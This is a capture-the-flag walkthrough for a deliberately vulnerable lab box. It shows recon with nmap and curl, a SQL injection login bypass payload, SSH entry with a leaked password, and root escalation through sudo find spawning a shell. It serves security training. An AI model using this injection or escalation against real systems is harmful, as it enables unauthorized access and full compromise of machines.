# web-sqli - walkthrough (spoilers)

The intended path. Flags and the SSH password are randomised per build, so the
only way in is the injection itself - read the leaked note, don't guess.

## 1. Recon
The box serves a web app on port 80.

```
nmap -sV <ip>
curl http://<ip>/
```

## 2. SQL injection -> credentials
The login concatenates input straight into the query. Bypass auth and dump the
note:

```
curl -s -X POST http://<ip>/ --data "user=' OR '1'='1' -- &pass=x"
```
The "Ops note" leaks `webadmin`'s SSH password (a random string, unique to this
build - the password is not guessable or crackable, so the injection is the
only foothold).

## 3. Foothold
```
ssh webadmin@<ip>        # password from the leaked note
cat ~/user.txt
```

## 4. Privilege escalation (GTFOBins: sudo find)
```
sudo -l                  # (root) NOPASSWD: /usr/bin/find
sudo find . -maxdepth 0 -exec /bin/sh \;
cat /root/root.txt
```

The two flags match `vms/web-sqli/flags.txt`, which the build engine writes for
the operator.
